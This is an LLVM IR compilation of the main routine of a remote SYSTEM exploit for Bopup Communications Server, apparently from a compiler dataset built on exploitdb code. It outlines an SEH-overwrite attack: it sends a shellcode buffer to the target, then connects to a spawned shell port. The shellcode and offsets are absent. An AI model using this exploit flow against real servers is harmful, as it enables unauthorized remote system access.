; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_9002.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_9002.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUF_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [128 x i8] c"Bopup Communications Server remote SYSTEM exploit\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2008!@$!\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [18 x i8] c"Usage: %s <host>\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@PORT_BOPUP = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [20 x i8] c"%s: sockami failed\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [23 x i8] c"* connected to %s:%d\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"** SEH offset @+%04X\0A\00", align 1
@BOPUP_STR_OFFSET = common dso_local global i32 0, align 4
@BOPUP_STR_LEN = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [25 x i8] c"** return addy @0x%08X\0A\0A\00", align 1
@BOPUP_POPRET = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [36 x i8] c"* building buffer with shellcode...\00", align 1
@.str.7 = private unnamed_addr constant [6 x i8] c"done\0A\00", align 1
@.str.8 = private unnamed_addr constant [21 x i8] c"* sending request...\00", align 1
@.str.9 = private unnamed_addr constant [35 x i8] c"%s: sock_send returned %d (!= %d)\0A\00", align 1
@.str.10 = private unnamed_addr constant [47 x i8] c"* waiting for the shellcode to be executed...\0A\00", align 1
@PORT_SHELL = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [10 x i8] c"+Wh00t!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = load i32, i32* @BUF_SIZE, align 4
  %11 = zext i32 %10 to i64
  %12 = call i8* @llvm.stacksave()
  store i8* %12, i8** %6, align 8
  %13 = alloca i8, i64 %11, align 16
  store i64 %11, i64* %7, align 8
  %14 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str, i64 0, i64 0))
  %15 = load i32, i32* %4, align 4
  %16 = icmp sle i32 %15, 1
  br i1 %16, label %17, label %25

17:                                               ; preds = %2
  %18 = load i32, i32* @stderr, align 4
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0), i8* %21)
  %23 = load i32, i32* @EXIT_SUCCESS, align 4
  %24 = call i32 @exit(i32 %23) #4
  unreachable

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = load i32, i32* @PORT_BOPUP, align 4
  %30 = call i32 @sockami(i8* %28, i32 %29)
  store i32 %30, i32* %8, align 4
  %31 = load i32, i32* %8, align 4
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %33, label %41

33:                                               ; preds = %25
  %34 = load i32, i32* @stderr, align 4
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %34, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0), i8* %37)
  %39 = load i32, i32* @EXIT_FAILURE, align 4
  %40 = call i32 @exit(i32 %39) #4
  unreachable

41:                                               ; preds = %25
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = load i32, i32* @PORT_BOPUP, align 4
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0), i8* %44, i32 %45)
  %47 = load i32, i32* @BOPUP_STR_OFFSET, align 4
  %48 = load i32, i32* @BOPUP_STR_LEN, align 4
  %49 = add nsw i32 %47, %48
  %50 = sub nsw i32 %49, 8
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i32 %50)
  %52 = load i32, i32* @BOPUP_POPRET, align 4
  %53 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0), i32 %52)
  %54 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.6, i64 0, i64 0))
  %55 = call i32 @zbuffami(i8* %13)
  %56 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.8, i64 0, i64 0))
  %58 = load i32, i32* %8, align 4
  %59 = load i32, i32* @BOPUP_STR_OFFSET, align 4
  %60 = load i32, i32* @BOPUP_STR_LEN, align 4
  %61 = add nsw i32 %59, %60
  %62 = call i32 @sock_send(i32 %58, i8* %13, i32 %61)
  store i32 %62, i32* %9, align 4
  %63 = load i32, i32* @BOPUP_STR_OFFSET, align 4
  %64 = load i32, i32* @BOPUP_STR_LEN, align 4
  %65 = add nsw i32 %63, %64
  %66 = icmp ne i32 %62, %65
  br i1 %66, label %67, label %79

67:                                               ; preds = %41
  %68 = load i32, i32* @stderr, align 4
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 0
  %71 = load i8*, i8** %70, align 8
  %72 = load i32, i32* %9, align 4
  %73 = load i32, i32* @BOPUP_STR_OFFSET, align 4
  %74 = load i32, i32* @BOPUP_STR_LEN, align 4
  %75 = add nsw i32 %73, %74
  %76 = call i32 (i32, i8*, i8*, ...) @fprintf(i32 %68, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.9, i64 0, i64 0), i8* %71, i32 %72, i32 %75)
  %77 = load i32, i32* @EXIT_FAILURE, align 4
  %78 = call i32 @exit(i32 %77) #4
  unreachable

79:                                               ; preds = %41
  %80 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i64 0, i64 0))
  %81 = load i32, i32* %8, align 4
  %82 = call i32 @close(i32 %81)
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.10, i64 0, i64 0))
  %84 = call i32 @sleep(i32 2)
  %85 = load i8**, i8*** %5, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 1
  %87 = load i8*, i8** %86, align 8
  %88 = load i32, i32* @PORT_SHELL, align 4
  %89 = call i32 @sockami(i8* %87, i32 %88)
  store i32 %89, i32* %8, align 4
  %90 = icmp ne i32 %89, -1
  br i1 %90, label %91, label %95

91:                                               ; preds = %79
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0))
  %93 = load i32, i32* %8, align 4
  %94 = call i32 @shellami(i32 %93)
  br label %95

95:                                               ; preds = %91, %79
  %96 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %96, i32* %3, align 4
  %97 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %97)
  %98 = load i32, i32* %3, align 4
  ret i32 %98
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fprintf(i32, i8*, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @sockami(i8*, i32) #2

declare dso_local i32 @zbuffami(i8*) #2

declare dso_local i32 @sock_send(i32, i8*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @shellami(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
